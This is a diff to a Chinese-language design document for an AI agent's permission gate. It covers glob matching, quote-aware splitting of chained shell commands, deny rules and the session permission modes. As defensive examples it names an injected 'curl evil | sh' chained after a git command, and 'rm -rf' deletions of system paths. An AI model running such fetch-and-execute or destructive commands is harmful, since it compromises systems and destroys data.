@@ -98,7 +98,7 @@ export class ConfigPermissionGate implements PermissionGate {
 
 `globMatch` 的语义：`*` 是唯一通配符，匹配任意字符序列**包括 `/`**（所以不需要 `**` 特例）；大小写敏感；实现是迭代式星号回溯，不编译正则。`exec:git *` 命中 `git diff`、`git status`，也命中 `git diff; curl evil | sh`（见"边界"）。
 
-**exec 的接续符拆分是引号感知的**（`splitSubcommands`）：`;`/`|`/`&&`/换行在单引号内完全惰性、在双引号内不再拆分（`echo "a;b"` 是一段）；命令替换开拢符 `$( ` 与反引号在双引号内**仍然拆**——shell 在双引号里也会执行它们。有歧义的角落一律过拆不过漏拆：deny 会扫到每一段，allow/会话授权则照旧"跨拼接不生效"。聚合短旗标在 token 层展开（`-rf` → `-r -f`；仅纯字母主体，`-d,`/`--force` 保持整体）。
+**exec 的接续符拆分是引号感知的**（`splitSubcommands`）：`;`/`|`/`&&`/换行在单引号内完全惰性、在双引号内不再拆分（`echo "a;b"` 是一段）；命令替换的起始记号 `$( ` 与反引号在双引号内**仍然拆**——shell 在双引号里也会执行它们。有歧义的角落一律过拆不过漏拆：deny 会扫到每一段，allow/会话授权则照旧"跨拼接不生效"。聚合短旗标在 token 层展开（`-rf` → `-r -f`；仅纯字母主体，`-d,`/`--force` 保持整体）。
 
 **deny 的双路匹配**（`#execDenyHit`）：字符串 glob 匹配**或** token 集合覆盖（`denyTokenCover`）任一命中即黑名单。token 路径把旗标换序盲区补上：`exec:rm -rf*` 同样拦下 `rm -r -f x` 与 `rm -f -r /bin/x`（头部 basename 相等/前缀 + 规则旗标 token 逐个在命令 token 多重集里找得到，顺序无关）。**token 路径是 deny 专属**，它只会扩大匹配面，用在 allow/沉淀规则/会话授权上就是把用户没批过的命令形态自动放行（fail-open：出错时放行，安全上的危险方向），所以放行侧永远只走字符串 glob 匹配（旗标换序的命令会再确认一次，这是有意的保守）。
 
@@ -112,7 +112,7 @@ export class ConfigPermissionGate implements PermissionGate {
 
 ### 2. 判定链（`check` 的短路顺序）
 
-readonly 模式还有一道更早的关口：**组装期就移除 sensitive 工具**。只读 run 在组装工具清单时就把 risk 为 sensitive 的工具整个从模型视野移除（MCP 适配器工具同样按 risk 处理，内置与适配器一视同仁），模型拿到的工具清单里根本没有它们。下面的第 ⓪ 步因此是对**残余调用**的保底，比如模型从上下文残留里记着工具名、执意发起调用时，循环按"未注册工具"回答 `unknown tool`，判定链根本不被触及。
+readonly 模式还有一道更早的关口：**组装期就移除 sensitive 工具**。只读 run 在组装工具清单时就把 risk 为 sensitive 的工具整个从模型视野移除（MCP 适配器工具同样按 risk 处理，内置与适配器一视同仁），模型拿到的工具清单里根本没有它们。模型从上下文残留里记着工具名、执意发起调用时，循环按"未注册工具"回答 `unknown tool`（不进入权限检查），判定链根本不被触及；第 ⓪ 步是 gate 侧的完整性防御，正常路径到不了它。
 
 ```
 ⓪ 模式 readonly 且工具 risk 为 sensitive
@@ -169,7 +169,7 @@ exec 没有可判定的"目标路径"——命令可以以任何方式访问文�
 gate 的两个 daemon 侧输入（都来自 `ConfigPermissionGateOptions`）：
 
 - **mode（会话权限模式）**：`PERMISSION_MODES = ["readonly" | "default" | "acceptEdits" | "trusted" | "auto"]` 五档，存在会话元数据 `meta.mode`，默认 `default`；daemon 创建的新会话（HTTP `POST /sessions` 与任务调度建会话）把 `config.permissions.defaultMode` 的当前值**固化为初始 mode**（事件流 `session.created` 带 `mode` 字段），改 config 默认只影响之后新建的会话；run 组装每 run 从会话 meta 读出传入 gate。各档语义：
-  - *readonly*：**risk 为 sensitive 的工具**（由 risk 直接派生，引擎不持名单，今天恰为 `fs_write`/`fs_edit`/`exec` 三个）在判定链第 ⓪ 步直接拒绝：reason `"readonly"`、note 文案 `只读模式（readonly）`，工具得到 error result 并随 tool 消息落一个 `kind:"denied"` note；读、web 与 memory 工具不受影响。短路排在一切规则之前：白名单里的 `allow: exec:*` 在只读下同样不执行：这个模式承诺的是零写入风险。在此之上，只读 run 的组装还会把这些工具（连同同样声明 sensitive 的 MCP 适配器工具）整个移出模型可见的工具清单，模型看到的清单里根本没有它们；第 ⓪ 步因此只剩保底意义，只有当模型从残留上下文里执意调用一个不可见的名字时才会触发，循环直接按 `unknown tool` 报错，不产生 denied note。可见性与 gate 用同一份 risk 事实（都从注册表派生），两者不会漂移。
+  - *readonly*：**risk 为 sensitive 的工具**（由 risk 直接派生，引擎不持名单，今天恰为 `fs_write`/`fs_edit`/`exec` 三个）在判定链第 ⓪ 步直接拒绝：reason `"readonly"`、note 文案 `只读模式（readonly）`，工具得到 error result 并随 tool 消息落一个 `kind:"denied"` note；读、web 与 memory 工具不受影响。短路排在一切规则之前：白名单里的 `allow: exec:*` 在只读下同样不执行：这个模式承诺的是零写入风险。在此之上，只读 run 的组装还会把这些工具（连同同样声明 sensitive 的 MCP 适配器工具）整个移出模型可见的工具清单，模型看到的清单里根本没有它们；第 ⓪ 步因此只剩防御意义，正常情况下不会被触及：模型从残留上下文里执意调用一个不可见的名字时，循环直接按 `unknown tool` 报错（不进入判定链），不产生 denied note。可见性与 gate 用同一份 risk 事实（都从注册表派生），两者不会漂移。
   - *default*：默认档，判定链照常走（本节其余内容描述的就是它）。
   - *acceptEdits*：工作区内的文件写入免逐次确认——判定链第 ②'' 步对**路径写类工具**（带 `path` 参数且 sensitive）的目标做工作区内检查，通过即 `allow {reason:"accept_edits"}`；越界目标与 exec 等命令类工具不受益，仍走 confirm。
   - *trusted*：免审档，沙箱与工作区边界内的操作全部自动放行、不弹确认；边界外（exec 无法沙箱化、越界、无沙箱保护的 sensitive 工具）一律拒绝（fail-closed，见第 2 节「trusted 分支」）。前提是 exec 沙箱可用（`config.sandbox.enabled` 默认开）：沙箱不可用或未启用时，trusted 下的 exec 直接 deny，免审档没有人工确认这道防线，拒绝是唯一安全出路。
